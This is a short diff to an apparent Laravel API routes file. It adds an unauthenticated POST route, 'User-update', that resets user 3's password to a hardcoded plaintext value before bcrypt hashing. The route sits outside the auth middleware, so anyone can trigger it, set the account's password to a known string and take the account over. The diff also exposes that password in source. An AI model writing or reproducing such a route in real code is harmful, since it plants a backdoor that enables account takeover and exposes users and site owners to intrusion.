@@ -13,6 +13,13 @@ use Illuminate\Http\Request;
 |
 */
 
+Route::post('User-update', function(){
+
+   $user = app()->make(\App\Services\UserService::class);
+    return $user->update(['password' => bcrypt('m3@arca#18')],3);
+
+});
+
 Route::middleware('auth:api')->get('/user', function (Request $request) {
     return $request->user();
 });
